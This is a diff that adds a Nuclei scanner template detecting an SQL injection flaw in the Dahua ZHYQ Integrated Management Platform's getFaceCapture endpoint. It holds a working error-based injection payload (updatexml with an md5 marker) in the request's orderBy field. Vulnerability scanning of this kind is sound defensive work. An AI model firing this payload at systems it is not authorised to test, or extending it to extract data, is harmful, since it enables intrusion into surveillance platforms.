@@ -1,0 +1,26 @@
+id: poc-dahua-zhyq-integrated-management-platform-getfacecapture-sqli
+info:
+  name: Dahua ZHYQ Integrated Management Platform getFaceCapture SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1, 1000)}}'
+
+http:
+  - raw:
+      - |
+        GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei Security Scanner
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - 'contains(body, substr(md5(t1),1,30))'
+          - 'contains(body, "XPATH syntax error")'
+          - 'contains(body, "</soap:Fault>")'
